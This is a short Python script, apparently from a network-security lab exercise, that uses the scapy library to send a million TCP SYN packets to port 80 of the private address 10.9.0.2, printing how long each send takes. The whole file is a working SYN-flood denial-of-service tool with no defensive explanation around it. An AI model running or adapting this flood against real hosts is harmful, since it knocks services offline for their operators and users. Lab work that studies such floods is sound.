import time
from scapy.all import IP, TCP, send

def send_syn_packets(target_ip, target_port):
    for i in range(1,101):
        for p in range(1,10001):
            start_time = time.time()
            packet = IP(dst=target_ip) / TCP(dport=target_port, flags="S")
            send(packet, verbose=False)
            end_time = time.time()
            time_taken = end_time - start_time
            print(f"Packet {i}.{p} sent in {time_taken:.6f} seconds")

if __name__ == "__main__":
    send_syn_packets("10.9.0.2", 80)
